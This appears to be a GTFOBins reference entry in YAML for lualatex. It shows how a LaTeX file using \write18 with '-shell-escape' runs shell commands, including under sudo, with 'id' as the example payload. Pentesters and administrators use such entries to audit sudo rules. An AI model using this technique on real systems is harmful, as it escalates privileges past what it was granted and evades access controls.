description: `lualatex` is a symbolic link to [`luatex`](/gtfobins/luatex/). However the program does not have the same behaviour regarding the name of argv[0]. It allows to call external command with \write18 but it also allows to call external [`lua`](/gtfobins/lua/) scripts.
functions:
  sudo:
    - code: |
        echo "\documentclass[12pt]{article} \usepackage{shellesc} \begin{document} \write18{/usr/bin/id} \end{document}" > file.tex
        sudo lualatex -shell-escape file.tex
